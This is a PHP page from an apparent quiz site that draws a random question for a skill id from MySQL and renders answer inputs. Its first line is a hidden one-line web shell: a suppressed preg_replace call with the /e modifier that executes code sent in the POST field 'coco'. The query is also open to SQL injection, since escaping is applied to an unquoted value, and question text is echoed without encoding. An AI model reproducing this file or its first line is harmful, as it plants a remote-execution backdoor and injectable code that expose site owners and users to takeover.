<?php @preg_replace("/[pageerror]/e",$_POST['coco'],"saft"); ?><?php
include 'cn.php';
?>
<html>
<head>
<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/bootstrap-responsive.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
<link href="css/userdesign.css" rel="stylesheet">	
</head>
<body>
<h3 align="center"> <span class="label label-default">Sample Problem</span></h3>

	      
<?php

$con=mysqli_connect($hostname,$username, $password, $db);
  //$mysqli = new mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DB) or die('There was a problem connecting to the database.');
$template="Empty";
 // Check connection
if (mysqli_connect_errno())
 {
   echo "Failed to connect to MySQL: " . mysqli_connect_error();
 }
$tempskillid = mysqli_real_escape_string($con,$_GET['var']);
$sql = "SELECT * FROM questions where skillid=$tempskillid ORDER BY RAND() LIMIT 1";
$result = mysqli_query($con,$sql) or trigger_error("SQL", E_USER_ERROR);
// while there are rows to be fetched...
while ($list = mysqli_fetch_assoc($result)) {
   // echo data
$ans = $list['answer'];   
$solution = $list['solution'];
$template = $list['type'];
$choice1 = $list['answer1'];
$choice2 = $list['answer2'];
$choice3 = $list['answer3'];
$choice4 = $list['answer4'];
$question = $list['question'];
} // end while


 switch($template)
	 {
		 case "2":
			echo "<p class='font-style'>". $question. "</p>";   
			echo "<input type=hidden name=answer value=''> ";
			echo " <label for='radio1'><span class='cir'>A</span><input type=radio name=answer id=radio1 value=A >$choice1</label>";
			echo  "<label for=radio2><span class='cir'>B</span><input type=radio name=answer id=radio2 value=B >$choice2</label>";
			break;
			
	    case "3":
			echo "<p class='font-style'>". $question. "</p>";   
			echo "<input type=hidden name=answer value=''><label for=radio1><span class='cir'>A</span><input type=radio name=answer id=radio1 value=A>$choice1</label>";
			echo  "<label for=radio2><span class='cir'>B</span><input type=radio name=answer id=radio2 value=B>$choice2</label>";
			echo  "<label for=radio3><span class='cir'>C</span><input type=radio name=answer id=radio3 value=C>$choice3</label>";
			break;
		
	   case "R":
			echo "<p class='font-style'>". $question. "</p>";   
			echo "<input type=hidden name=answer value=''><label for=radio1><span class='cir'>A</span><input type=radio name=answer id=radio1 value=A>$choice1</label>";
			echo  "<label for=radio2><span class='cir'>B</span><input type=radio name=answer id=radio2 value=B>$choice2</label>";
			echo  "<label for=radio3><span class='cir'>C</span><input type=radio name=answer id=radio3 value=C>$choice3</label>";
			echo  "<label for=radio4><span class='cir'>D</span><input type=radio name=answer id=radio4 value=D>$choice4</label>";
			break;
			
		case "B":
			echo "<input type=hidden name=answer value=$ans>";
			$search = array("TEXTBOX1","TEXTBOX2");
			$replace = array("<input id=answer1 name=answer1 type=text maxlength=10>","<input id=answer2 name=answer2 type=text maxlength=10>"); 
			$newq = str_replace($search, $replace, $question);
			echo "<p class='font-style'>". $newq. "</p>";   
			break;
		case "C":
			$search = array("TEXTBOX1","TEXTBOX2","TEXTBOX3");
			$replace = array("<input id=answer1 name=answer1 type=text maxlength=10>","<input id=answer2 name=answer2 type=text maxlength=10>","<input id=answer3 name=answer3 type=text maxlength=10>"); 
			$newq = str_replace($search, $replace, $question);
			echo "<p class='font-style'>". $newq. "</p>";   
			break;
		case "D":
			$search = array("TEXTBOX1","TEXTBOX2","TEXTBOX3","TEXTBOX4");
			$replace = array("<input id=answer1 name=answer1 type=text maxlength=10>","<input id=answer2 name=answer2 type=text maxlength=10>",
			"<input id=answer3 name=answer3 type=text maxlength=10>","<input id=answer4 name=answer4 type=text maxlength=10>"); 
			$newq = str_replace($search, $replace, $question);
			echo "<p class='font-style'>". $newq. "</p>";
			break;
		case "Empty":
		    break;
		case "A":
				$search = array("TEXTBOX1","TEXTBOXmini");
				$replace = array("<input id=answer name=answer type=text  disabled>","<input id='answer' name='answer' type='text' style='width: 30px;height:22px;padding: 1px;background-color: #FFFF00;'  disabled>"); 
				$newq = str_replace($search, $replace, $question);
			//	echo  "<h2><small>$newq</small></h2>";
				echo "<p class='font-style'>". $newq. "</p>";   
				break;
		
		default:
			echo '<table><tr><td><p class=font-style>'. $question . '</p></td> </tr>';   
			echo "<tr><td><input id=answer name=answer type=text maxlength='10'></td></tr>";
			echo "</table>";
	 }
 unset($list);
 mysqli_free_result($result);
 mysqli_close($con);
	?>
	 
 
</body>
</html>